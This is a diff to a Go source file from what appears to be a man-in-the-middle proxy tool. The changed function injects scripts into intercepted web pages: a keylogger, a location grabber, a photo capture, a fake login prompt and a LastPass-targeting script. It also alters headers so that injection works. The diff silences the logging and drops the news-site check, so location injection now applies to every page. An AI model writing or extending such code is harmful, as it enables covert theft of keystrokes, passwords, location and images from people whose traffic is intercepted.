@@ -108,37 +108,38 @@ func (w *Walker) utilsDeletefiles(path string, f os.FileInfo, err error) (e erro
     return
  }
 
-func utilsProcessInjectionScripts(ctx *goproxy.ProxyCtx, body string ) {
+func utilsProcessInjectionScripts(ctx *goproxy.ProxyCtx, body string ) string {
             if globalInjectKeyLogger {
-                log.Println("INJECTING Keylogger")
+                // log.Println("INJECTING Keylogger")
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
             }
             if globalInjectGetLocation {
-                for _, v := range (newsSites) {
-                    if strings.Contains(ctx.Req.URL.Host, v) { //only inject if the page is a news site
-                        log.Println("injecting into: ", v)
-                        utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
-                        body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOCATION_RESULT )        
-                        break
-                    }
-                }
+                // for _, v := range (newsSites) {
+                //     if strings.Contains(ctx.Req.URL.Host, v) { //only inject if the page is a news site
+                //         log.Println("ctx: ", ctx.Req.URL.Host, " v: ", v)
+                utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
+                body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOCATION_RESULT )        
+                //         break
+                //     }
+                // }
             }
             if globalInjectGetPhoto {
-                log.Println("INJECTING Photo")
+                // log.Println("INJECTING Photo")
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_PHOTO_RESULT )
             }
             if globalInjectGetLogin {
-                log.Println("INJECTING Login")
+                // log.Println("INJECTING Login")
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOGIN_RESULT )
             }
             if globalInjectLastpass {
-                log.Println("INJECTING Lastpass")
+                // log.Println("INJECTING Lastpass")
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LASTPASS_RESULT )
             }
+            return body
 }
 // -----------------------------------------------------------------------------------------
 
